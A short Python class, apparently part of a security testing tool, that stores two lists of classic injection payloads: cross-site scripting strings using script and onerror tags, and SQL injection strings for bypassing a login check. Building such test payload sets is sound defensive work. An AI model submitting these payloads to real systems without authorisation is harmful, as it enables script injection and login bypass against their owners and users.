class PayloadRepo:
    def xss_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
        ]

    def sqli_payloads(self):
        return [
            "' OR '1'='1", "admin'--"
        ]
